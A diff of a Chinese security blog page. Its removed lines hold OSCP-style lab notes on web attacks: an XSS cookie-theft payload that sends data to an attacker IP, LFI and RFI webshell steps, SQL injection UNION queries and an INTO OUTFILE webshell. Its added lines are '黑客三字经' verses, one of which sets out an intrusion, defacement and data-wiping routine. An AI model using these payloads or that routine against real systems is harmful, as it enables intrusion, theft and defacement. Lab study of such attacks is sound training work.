@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OSCP-Web应用程序攻击 | 尚方信息安全官网</title>
+  <title>黑客三字经 | 尚方信息安全官网</title>
   <meta name="keywords" content="">
-  <meta name="description" content="OSCP-Web应用程序攻击 | 尚方信息安全官网">
+  <meta name="description" content="黑客三字经 | 尚方信息安全官网">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="站长的自我介绍法老，山东本地人； 渗透测试工程师&#x2F;培训讲师； 年龄不详&#x2F;性格谨慎&#x2F;生活豪放；  从14年接触黑客技术，在网络上各大安全论坛购买资料学习；先后加入了中国红客联盟&#x2F;暗安全技术小组&#x2F;等各大优秀的技术安全团队；本着提高自身理论知识面与技术实战能力，同时加强黑客武器库开发与使用时效性以及人脉扩展 ，成立尚方安全团队，并特此建设该网站做技术分享。">
 <meta property="og:type" content="website">
@@ -659,9 +659,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-OSCP-Web应用程序攻击" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-黑客三字经" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">OSCP-Web应用程序攻击</h1>
+        <h1 class="article-title">黑客三字经</h1>
     
     <div class="article-meta">
         
@@ -671,7 +671,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="计算机认证">计算机认证</a>
+            <a  data-rel="总结与分享">总结与分享</a>
             
         </span>
         
@@ -679,7 +679,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-03-01 20:47:11'>2021-03-01 15:39</time>
+            Created At : <time class="date" title='Updated At: 2021-04-06 13:00:41'>2021-04-06 12:50</time>
         
     </div>
     <div class="article-meta">
@@ -701,7 +701,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9AWeb%E5%BA%94%E7%94%A8%E6%9E%9A%E4%B8%BE"><span class="toc-text">一：Web应用枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9A%E6%A3%80%E6%9F%A5URL"><span class="toc-text">1：检查URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9A%E6%A3%80%E6%9F%A5%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9"><span class="toc-text">2：检查文本内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%9A%E6%A3%80%E6%9F%A5%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-text">3：检查响应头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%9A-%E6%A3%80%E6%B5%8B%E7%BD%91%E7%AB%99%E5%9C%B0%E5%9B%BE"><span class="toc-text">4： 检测网站地图</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%BC%9A%E6%9F%A5%E6%89%BE%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="toc-text">5：查找管理控制台</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9AWEB%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E8%AF%84%E4%BC%B0%E5%B7%A5%E5%85%B7"><span class="toc-text">二：WEB应用程序评估工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9ADIRB"><span class="toc-text">1：DIRB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9ABurpSuite"><span class="toc-text">2：BurpSuite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%9ANikto"><span class="toc-text">3：Nikto</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E5%9F%BA%E4%BA%8EWEB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">三：基于WEB漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9A%E5%88%A9%E7%94%A8%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="toc-text">1：利用管理控制台</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-text">2：跨站脚本攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%9AExercises"><span class="toc-text">3：Exercises</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-text">四：目录遍历漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">五：文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="toc-text">1：本地文件包含（LFI）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9A%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="toc-text">2：远程文件包含（RFI）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%EF%BC%9A%E6%8A%80%E8%83%BD%E6%89%A9%E5%B1%95"><span class="toc-text">六：技能扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9AHTTP%E6%9C%8D%E5%8A%A1"><span class="toc-text">1：HTTP服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9APHP%E5%8C%85%E8%A3%85%E5%99%A8"><span class="toc-text">2：PHP包装器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%9AExercises-1"><span class="toc-text">3：Exercises</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%EF%BC%9ASQL%E6%B3%A8%E5%85%A5"><span class="toc-text">七：SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9A%E5%9F%BA%E6%9C%ACSQL%E8%AF%AD%E6%B3%95"><span class="toc-text">1：基本SQL语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9A%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-text">2：绕过身份认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%9A%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">3：常规SQL注入攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%9A%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">4：代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%BC%9A%E8%87%AA%E5%8A%A8%E5%8C%96SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">5：自动化SQL注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%EF%BC%9A%E9%A2%9D%E5%A4%96%E7%A8%8B%E5%BA%8F"><span class="toc-text">八：额外程序</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%80%81%E9%BB%91%E5%AE%A2%E4%B8%89%E5%AD%97%E7%BB%8F"><span class="toc-text">老黑客三字经</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E9%BB%91%E5%AE%A2%E4%B8%89%E5%AD%97%E7%BB%8F"><span class="toc-text">新黑客三字经</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%E4%B8%89%E5%AD%97%E7%BB%8F"><span class="toc-text">黑客编程三字经</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E8%A8%80"><span class="toc-text">序言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Scheme"><span class="toc-text">1:Scheme</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-C"><span class="toc-text">2:C</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%B1%87%E7%BC%96%EF%BC%88Assembly-Coding%EF%BC%89"><span class="toc-text">3:汇编（Assembly Coding）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-text">4:总结</span></a></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -717,206 +717,52 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="一：Web应用枚举"><a href="#一：Web应用枚举" class="headerlink" title="一：Web应用枚举"></a>一：Web应用枚举</h1><blockquote>
-<p>WEB应用程序有以下组成：</p>
-<ul>
-<li>编程语言和框架</li>
-<li>WEB服务器软件</li>
-<li>数据库软件</li>
-<li>服务器操作系统</li>
-</ul>
+        <h1 id="老黑客三字经"><a href="#老黑客三字经" class="headerlink" title="老黑客三字经"></a>老黑客三字经</h1><blockquote>
+<p>进谷歌 找注入<br>没注入 就旁注<br>没旁注 用Oday<br>没Oday 猜目录<br>没目录 就嗅探<br>爆账户 找后台<br>传小马 放大马<br>拿权限 挂页面<br>放暗链 清数据</p>
 </blockquote>
-<h4 id="1：检查URL"><a href="#1：检查URL" class="headerlink" title="1：检查URL"></a>1：检查URL</h4><ul>
-<li>URL当中的文件扩展名</li>
-</ul>
-<h4 id="2：检查文本内容"><a href="#2：检查文本内容" class="headerlink" title="2：检查文本内容"></a>2：检查文本内容</h4><h4 id="3：检查响应头"><a href="#3：检查响应头" class="headerlink" title="3：检查响应头"></a>3：检查响应头</h4><h4 id="4：-检测网站地图"><a href="#4：-检测网站地图" class="headerlink" title="4： 检测网站地图"></a>4： 检测网站地图</h4><ul>
-<li>rebots.txt</li>
-<li>sitemap.xml</li>
-</ul>
-<h4 id="5：查找管理控制台"><a href="#5：查找管理控制台" class="headerlink" title="5：查找管理控制台"></a>5：查找管理控制台</h4><ul>
-<li>tomcat  /manager/html</li>
-<li>mysql /phpmyadmin</li>
-</ul>
-<h1 id="二：WEB应用程序评估工具"><a href="#二：WEB应用程序评估工具" class="headerlink" title="二：WEB应用程序评估工具"></a>二：WEB应用程序评估工具</h1><h4 id="1：DIRB"><a href="#1：DIRB" class="headerlink" title="1：DIRB"></a>1：DIRB</h4><blockquote>
-<p>dirb是一个基于字典的web目录扫描工具，会用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站</p>
+<h1 id="新黑客三字经"><a href="#新黑客三字经" class="headerlink" title="新黑客三字经"></a>新黑客三字经</h1><blockquote>
+<p>搞企业 先扫描<br>扫描器 商业好<br>默密码 都知道<br>社工库 找一找<br>邮箱号 先列好<br>九头蛇 跑一跑<br>搞不定 放大招<br>发邮件 凭伪造<br>没邮箱 搞网站<br>二级域 皆可爆<br>老漏洞 没修好<br>新漏洞 刷一票<br>干研发 Git 找<br>源代码 全都要<br>C D N 可以跳<br>防火墙 可以撬<br>堡垒机 可以秒<br>云防护 可以秒<br>是企业 没有哪家搞不了！</p>
 </blockquote>
-<pre><code class="shell">kali#dirb http://www.megacorpone.com -r -z 10
--r    用非递归方式扫描
--z 10 为每个请求添加10毫秒延迟，添加毫秒延迟，避免洪水攻击</code></pre>
-<p><strong>注意：</strong>DirBuster是一个多线程的基于Java的应用程序设计蛮力Web /应用服务器上的目录和文件名</p>
-<h4 id="2：BurpSuite"><a href="#2：BurpSuite" class="headerlink" title="2：BurpSuite"></a>2：BurpSuite</h4><ul>
-<li>设置拦截HTTPS流量</li>
-<li>拦截响应包</li>
-</ul>
-<h4 id="3：Nikto"><a href="#3：Nikto" class="headerlink" title="3：Nikto"></a>3：Nikto</h4><blockquote>
-<p>基于perl语言开发的web页面扫描器。其特点扫描全面，速度快</p>
+<h1 id="黑客编程三字经"><a href="#黑客编程三字经" class="headerlink" title="黑客编程三字经"></a>黑客编程三字经</h1><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><blockquote>
+<p>黑客道，要学好。为什么？很重要。<br>哲数技，是整体。三兼顾，乃法宝。<br>老与庄，立圭臬，垂青史，永光耀。<br>黑客道，承衣钵，铸辉煌，吹号角。</p>
+<p>追求真，学哲理。习数学，抓泛导。<br>崇尚善，为亿万。实无穷，成泛极。<br>运泛极，体现美。此财富，极自豪。<br>造泛通，至极致，方入禅，自由了。</p>
+<p>黑客道，三乘三。十余载，精选挑。<br>表处理、做系统、加汇编，水平高。<br>每一种，三阶段，细分解，困难少。<br>三语言，有侧重，各不同，听唠叨。</p>
 </blockquote>
-<pre><code class="shell">kali#nikto -host=http://www.megacorpone.com -maxtime=30s
--host 扫描目标URL
--maxtime=30s 最大扫描时间为30秒</code></pre>
-<p><strong>Exercises</strong></p>
-<ul>
-<li>查看Kali Linux中Web应用程序分析菜单下可用的应用程序</li>
-</ul>
-<h1 id="三：基于WEB漏洞的利用"><a href="#三：基于WEB漏洞的利用" class="headerlink" title="三：基于WEB漏洞的利用"></a>三：基于WEB漏洞的利用</h1><h4 id="1：利用管理控制台"><a href="#1：利用管理控制台" class="headerlink" title="1：利用管理控制台"></a>1：利用管理控制台</h4><ul>
-<li><p>使用BP中的intrude对phpmyadmin进行爆破<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41210745/article/details/103012008">参考链接</a></p>
-<pre><code class="mysql">select * from webappdb.users;
-#查看后台登录用户密码信息
-insert into webappdb.users{password,username} VALUES {"backdoor","backdoor"}
-#在phpmyadmin中添加后台账号</code></pre>
-</li>
-</ul>
-<p><strong>Exercises</strong></p>
-<ul>
-<li>使用Burp入侵者访问Windows1o实验室机器上运行的phpMyAdmin系统</li>
-<li>在·users·表中插入一个新用户</li>
-</ul>
-<h4 id="2：跨站脚本攻击"><a href="#2：跨站脚本攻击" class="headerlink" title="2：跨站脚本攻击"></a>2：跨站脚本攻击</h4><blockquote>
-<p>窃取Cookie和会话信息</p>
+<h4 id="1-Scheme"><a href="#1-Scheme" class="headerlink" title="1:Scheme"></a>1:Scheme</h4><blockquote>
+<p>表处理，很古老。排次序，用列表。<br>互联网，未过时，新集散，很热闹。<br>内行人，看门道。细分析，分组包。<br>包跟包，序关系。无非是，老一套。</p>
+<p>万维网，是窗口，其实质，传符号。<br>十单元，口诀表。万物初，皆原子。<br>原子多，两大类：曰数字、曰符号。<br>数与术，任运作，排好队，成列表。</p>
+<p>究本源，零或一，建尺度，无更小。<br>静辖域、块结构。尾递归，妙嵌套。<br>先前继、再后续、间测零、不动点。<br>细分清，非递推。递归法，具四要。</p>
+<p>算算子，成高阶，威力大。扩全局，<br>限局部，准引用，常结合，要用好。<br>云行天，雨施地。时间流，可延迟。<br>吞或吐，过端口，打开后，要关掉。</p>
+<p>辨语义，比创意，连续者，最独到。<br>善驾驭，出神奇，可命名、可传递、<br>可返回、可联合。跳千里；能回溯；<br>两任务、相协作；多进程、可互导。</p>
+<p>多回值、动态风、卫生宏，比妖娆，<br>数一流。一滴水，千条虫。眼不见，<br>心不烦。杂环境，打成包。若认真，<br>再解包。元循环，一堆栈，七寄存。</p>
+<p>零比零，成浑沌。非确定，世常态。<br>多层析，模糊集、粗糙集，阴阳爻。<br>扩主体，成广义。求大善，有遗憾。<br>有所得，必有失。抓尺度，兴波涛。</p>
+<p>波涛丛，可排队。寻规律，求正交。<br>正交系，引拓扑，入泛函，对称显。<br>变换法，有拉氏、傅立叶、加卷积……<br>商化积，宏可敌。藏局部，对象俏。</p>
 </blockquote>
-<p><strong>Secure</strong>标志指示浏览器仅通过加密连接（如HTTPS）发送cookie。这样可以防止cookie以明文形式发送并通过网络捕获。<br><strong>http-only</strong>标志指示浏览器拒绝JavaScript对cookie的访问。如果没有设置这个标志，我们可以使用XSS负载来窃取cookie。</p>
-<ol>
-<li>Xss Payload</li>
-</ol>
-<pre><code class="js">&lt;script&gt;new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;&lt;/script&gt;</code></pre>
-<ol start="2">
-<li>Powershell模拟用户登录</li>
-</ol>
-<pre><code class="powershell">$username="admin"
-$password="p@ssw0rd"
-$url_login="127.0.0.l/login.php"
-$ie  =New-Object-com  InternetExplorer.Application
-$ie.Visible  =  $true
-$ie.navigate("$url_login")
-while($ie.ReadyState  -ne  4){  start-sleep  -m  1000}
-$ie.document.getElementsByName("username")[0].value="$username"
-$ie.document.getElementsByName("password")[0].value="$password"
-start-sleep  -m  10
-$ie.document.getElementsByClassName("btn") [0] .click()
-start-sleep  -m  100
-$ie.Quit()
-[System.Runtime.Interopservices.MarshalJ::ReleaseComObject($ie)</code></pre>
-<pre><code class="powershell"> powershell -ExecutionPolicy Bypass -File admin_login.psl</code></pre>
-<ol start="3">
-<li>攻击者获取Cookie值</li>
-</ol>
-<pre><code class="shell">kali#nc  -nvlp  88
-...</code></pre>
-<ol start="4">
-<li>火狐插件：<strong>Cookie-Editor</strong></li>
-</ol>
-<h4 id="3：Exercises"><a href="#3：Exercises" class="headerlink" title="3：Exercises"></a>3：Exercises</h4><ul>
-<li>练习以上实验</li>
-<li>考虑一下该应用程序中的XSS漏洞还可以通过哪些方式进行攻击</li>
-<li>此漏洞是否会攻击站点的服务器或客户端</li>
-</ul>
-<h1 id="四：目录遍历漏洞"><a href="#四：目录遍历漏洞" class="headerlink" title="四：目录遍历漏洞"></a>四：目录遍历漏洞</h1><blockquote>
-<p>目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以使web根目录以外的文件），甚至执行系统命令。</p>
+<h4 id="2-C"><a href="#2-C" class="headerlink" title="2:C"></a>2:C</h4><blockquote>
+<p>筑系统，重内核。细节多，要周到。<br>先复述，后重现。此伉俪，感情牢。<br>个性强，不完美，陷阱多，却流行。<br>造基砖，用指针，列三纲，归五常。</p>
+<p>三纲者，为赋值、为检索、为交换。<br>五常者，辟空间、起名称、装地址、<br>列类型、定初值。五缺一，有问题。<br>诸病毒，有正奇。其根源，在这里。</p>
+<p>遵纲常，皆实质。要入门，须明了。<br>初上路，没感觉。不着急，多练习！<br>先熟练，熟生巧。修炼时，抗干扰。<br>入洞天，境奇妙。快深频，三步跳。</p>
+<p>优先级，结合级，不明时，加括号。<br>先乘除、后加减。用等号，值比较？<br>为赋值？单双敲，须仔细，不混淆。<br>断逻辑，与或非，莫忘记，非最早。</p>
+<p>书程序，预编译，宏代换，头文件，<br>两选择、四循环。句法糖，都不难。<br>大括弧，合多句，站一起，配分号。<br>数组快，带类型，可多维，姻指针。</p>
+<p>库函数，是帮手。多给予，少苛求。<br>不迷信，勿盲从。能用否？凭自主。<br>著作权，双刃剑，仅防身，毋伤人。<br>凡专利，皆毒药，人人打，过街鼠。</p>
+<p>众结构，好归纳。有向量，有链表。<br>有堆栈，有队列。有集合，有哈希。<br>多棵树，可成图。一大堆，带权限、<br>再列队。此十种，很基础，组合爆。</p>
+<p>做移植，廿四库。进与出，互逆向。<br>全遍历、加过滤。若实现，即明了！<br>论算法，读内核。六模块，细节杂，<br>抓接口，能简化。须持久，戒急躁。</p>
 </blockquote>
-<pre><code class="http">http://www.baidu.com/menu.php?file=current_menu.php
-http://www.baidu.com/menu.php?file=old.php
-http://www.baidu.com/menu.php?file=c:\windows\system32\drivers\etc\hosts</code></pre>
-<p><strong>Exercises</strong></p>
-<ul>
-<li>利用目录遍历漏洞读取Windows 10 上的任意文件</li>
-</ul>
-<h1 id="五：文件包含漏洞"><a href="#五：文件包含漏洞" class="headerlink" title="五：文件包含漏洞"></a>五：文件包含漏洞</h1><blockquote>
-<p>本地文件包含（LFI）发生在从同一web服务器加载包含的文件时。从外部源加载文件时会发生远程文件包含（RFI）。这些漏洞通常出现在PHP应用程序中，但也可能出现在其他编程语言中。</p>
+<h4 id="3-汇编（Assembly-Coding）"><a href="#3-汇编（Assembly-Coding）" class="headerlink" title="3:汇编（Assembly Coding）"></a>3:汇编（Assembly Coding）</h4><blockquote>
+<p>二进制，即阴阳。老祖宗，早用了！<br>通神明、类万物。卦象多，寓哭笑。<br>各硬件，死机器。盘活它，有诀窍。<br>当黑客，练汇编。过了关，技巧刁。</p>
+<p>三八六，是主流。实模式，先上手。<br>指令集，要分类。不怕它，慢调校。<br>寄存器，芯片里，看不见，莫着急。<br>寻址法，可直接，可间接，弯弯绕。</p>
+<p>各大段，有起始。要配合，偏移量。<br>代码段，不宜改。数据段，变化乱，<br>有静态、有动态。动态段，有堆栈、<br>有附加。寻址时，要记住，段类型。</p>
+<p>堆栈里，名堂多。四大类：参数表、<br>返回址、表达式、局部值。名与实，<br>本是空，空生无，无生有。阴与阳，<br>阳含阴、阴含阳，可互转，程序跑。</p>
+<p>作乐趣，生中断。中断源，有硬软。<br>软中断，可自编。切换时，就跳转。<br>视条件，判标志，勤开关，旌旗妍。<br>护现场，备后唤。总导演：时钟源。</p>
+<p>浮点数、字符串、多媒体、皆疑难。<br>除法慢，能右移，则右移，省时间。<br>有理数，有精度，保任务，巧截取。<br>汇编器，一翻译。伪指令，好太监。</p>
+<p>诸八仙，异神通，过大海，互调用。<br>烂石子，铺街美。有章法，郑板桥。<br>他山石，可攻玉，扬他长，避己短。<br>二接口，准模拟，混合法，大势潮。</p>
+<p>善御之，仿级数，有收敛，有发散。<br>谙一种，即扩展。巧组合，半变万。<br>成大器，谋大业。制胜术，贵在速，<br>敏应需。要记住：时易逝，金不换。</p>
 </blockquote>
-<p><strong>注意：</strong>windows10lab机器上的php.ini文件可以在C:\xampp\php\php.ini文件.  在对此文件进行任何更改之前，请考虑进行备份</p>
-<p><strong>注意：</strong>请注意，目录遍历漏洞通常与LFl一起使用，特别是用于指定LFI负载中使用的文件。</p>
-<h4 id="1：本地文件包含（LFI）"><a href="#1：本地文件包含（LFI）" class="headerlink" title="1：本地文件包含（LFI）"></a>1：本地文件包含（LFI）</h4><pre><code class="shell">C:\Users\admin\Documents&gt;  powershell  -ExecutionPolicy  Bypass  -File  clear_logs.psl  #清除日志文件</code></pre>
-<pre><code class="shell">kali@kali:~$  nc  -nv  10.11.0.22  88   #发起请求
-(UNKNOWN)  [10.11.0.22]  80  (http)  open
-&lt;?php  echo '&lt;pre&gt;'•shell_exec($_GET['cmd'])•'&lt;/ pre&gt; ';?&gt;  #发送数据</code></pre>
-<pre><code class="shell">http://10.ll.0.22/menu.php?file=c:\xampp\apache\logs\access.log&amp;cmd=ipconfig #文件包含执行命令</code></pre>
-<p><strong>Exercises</strong></p>
-<ul>
-<li>使用代码执行来获得完整的shell</li>
-</ul>
-<h4 id="2：远程文件包含（RFI）"><a href="#2：远程文件包含（RFI）" class="headerlink" title="2：远程文件包含（RFI）"></a>2：远程文件包含（RFI）</h4><pre><code class="http">http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt</code></pre>
-<pre><code class="shell">kali@kali:/var/www/html$cat  evi.txt
-&lt;?php  echo  shell_exec($_GET['cmd']); ?&gt;
-kali@kali:/var/www/html$ sudo systemct restart apache2</code></pre>
-<pre><code class="http">http://10.11.0.22/menu.php?file=http://18.11.0.4/evit.txt &amp;cmd=ipconfig</code></pre>
-<p><strong>注意：</strong>Webshell存放位置<code>/usr/share/webshells</code></p>
-<p><strong>Exercises</strong></p>
-<ul>
-<li>利用web应用程序中的RFI漏洞获取shell</li>
-<li>使用/menu2.phpfile=current_menu作为起点，使用RFI获取shell</li>
-<li>使用其中一个包含Kali的webshell来获取有关windows10目标的详细信息</li>
-</ul>
-<h1 id="六：技能扩展"><a href="#六：技能扩展" class="headerlink" title="六：技能扩展"></a>六：技能扩展</h1><h4 id="1：HTTP服务"><a href="#1：HTTP服务" class="headerlink" title="1：HTTP服务"></a>1：HTTP服务</h4><ol>
-<li><p>Python2</p>
-<pre><code class="python">python  -m  SimpteHTTPServer  7331</code></pre>
-</li>
-<li><p>python3</p>
-<pre><code class="python">python3  -m  http.server  7331</code></pre>
-</li>
-<li><p>Php</p>
-<pre><code class="php"> php  -s  0.0.0.0:8888</code></pre>
-</li>
-<li><p>Ruby</p>
-<pre><code class="shell">ruby  -run  -e  httpd . -p  9008</code></pre>
-</li>
-<li><p>busybox</p>
-<pre><code class="shell">busybox  httpd  -f  -p  18880</code></pre>
-</li>
-</ol>
-<h4 id="2：PHP包装器"><a href="#2：PHP包装器" class="headerlink" title="2：PHP包装器"></a>2：PHP包装器</h4><blockquote>
-<p><strong>data:text/ptain,helloworld</strong> data:表示要传输的内容  text/ptain表示传输的数据类型为文本 helloworld为传输内容</p>
+<h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4:总结"></a>4:总结</h4><blockquote>
+<p>识局整、判形影、辨异同、排泛序、<br>显运转、度生克。十八字，是学魂。<br>融数学、方法论、系统论、逻辑学、<br>本体论、价值观，六统一，悟归宿。</p>
+<p>成才法，靠七故。若不足，运筹好。<br>七故中，静心态、祛杂念，最难调。<br>创伟业，仰人文。敬师友，谦受益。<br>广开源，需扬弃。做学问，忌浮飘。</p>
+<p>软件业，要自立。靠什么？唯创新。<br>谁创新？数人才。要人才，哪里来？<br>成才路，不一格。独木桥、阳关道，<br>千万条。孰最多？中国人，领风骚。</p>
 </blockquote>
-<pre><code class="http">http://10.ll.0.22/menu.php? fite=data:text/ptain,hettoworld</code></pre>
-<pre><code class="http">http://10.ll.0.22/menu.php?file=data:text/plain,&lt;?php echo shell_exec("dir")?&gt;</code></pre>
-<h4 id="3：Exercises-1"><a href="#3：Exercises-1" class="headerlink" title="3：Exercises"></a>3：Exercises</h4><ul>
-<li>使用PHP包装器攻击LFI漏洞</li>
-<li>使用PHP包装器在windows10实验室机器上获取shell。</li>
-</ul>
-<h1 id="七：SQL注入"><a href="#七：SQL注入" class="headerlink" title="七：SQL注入"></a>七：SQL注入</h1><h4 id="1：基本SQL语法"><a href="#1：基本SQL语法" class="headerlink" title="1：基本SQL语法"></a>1：基本SQL语法</h4><pre><code class="mysql">select * from users; #查询users表中的内容
-select username from users where id = 1;  #查询users表中的username字段并且查询条件为id值等于1
-</code></pre>
-<h4 id="2：绕过身份认证"><a href="#2：绕过身份认证" class="headerlink" title="2：绕过身份认证"></a>2：绕过身份认证</h4><pre><code class="mysql">select * from users where name='tom' and password='jones ';
-select * from users where name='tom' or 1=1;#'and password='jones';
-select * from users where name='tom' or 1=1;
-select * from users where name='tom' or l=l LIMIT l;#</code></pre>
-<blockquote>
-<p><a href="http://10.11.0.2/login.php->admin.php">http://10.11.0.2/login.php-&gt;admin.php</a>    <code>tom' or 1=1 LIMIT 1;#</code></p>
-</blockquote>
-<p><strong>Exercises</strong></p>
-<ul>
-<li>与MariaDB数据库交互并手动执行所需的命令以向应用程序。了解漏洞</li>
-<li>SQL注入username字段以绕过登录过程</li>
-<li>为什么在验证完成后，用户名会像在web应用程序中一样显示流程被绕过？</li>
-<li>在password字段中执行SQ Linjection。有效载荷中是否需要“限制1”？</li>
-</ul>
-<h4 id="3：常规SQL注入攻击"><a href="#3：常规SQL注入攻击" class="headerlink" title="3：常规SQL注入攻击"></a>3：常规SQL注入攻击</h4><pre><code class="http">http://10.ll.0.22/debug.php?id=l order by 1    #查询存在多少字段
-http://10.11.0.22/debug.php?id=l union all select 1,2,3  #联合查询字段是否存在内容
-http://10.11.0.22/debug.php?id=l union all select 1,2,@@ version  #3数字位置存在内容,可查询数据库版本信息
-http://10.ll.0.22/debug.php?id=l union all select 1,2,user()  #3数字位置存在内容,可查询数据库用户信息
-http://10.ll.0.22/debug.php?id=l union all select 1,2,table_name from information_schema.tables
-#查询表名
-http://10.ll.0.22/debug.php?id=l union all select 1,2,column_name from information_schema.columns where  table_name='users'  #查询列名字
-http://10.11.0.22/debug.php?id=l union all select 1,username,password from users #查询字段内容</code></pre>
-<p><strong>Exercises</strong></p>
-<ul>
-<li>使用SQL注入枚举数据库的结构</li>
-<li>了解如何以及为什么可以从注入的命令中提取数据并将其保存显示在屏幕上</li>
-<li>从数据库中提取所有用户和关联的密码</li>
-</ul>
-<h4 id="4：代码执行"><a href="#4：代码执行" class="headerlink" title="4：代码执行"></a>4：代码执行</h4><p><strong>文件读取</strong></p>
-<pre><code class="http">http://10.11.0.22/debug.php?id=l union all select  1,2,load_file('C:/Windows/System32/drivers/etc/hosts')</code></pre>
-<p><strong>Getshell</strong></p>
-<pre><code class="http">http://10.ll.0.22/debug.php?id=l union all select 1,2,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;" into OUTFILE  'c:/xampp/htdocs/backdoor.php'</code></pre>
-<p><strong>Exercises</strong></p>
-<ul>
-<li>利用SQL注入和MariaDB INTO OUTFILE函数获取代码执行</li>
-<li>把简单的代码执行变成一个完整的shell。</li>
-</ul>
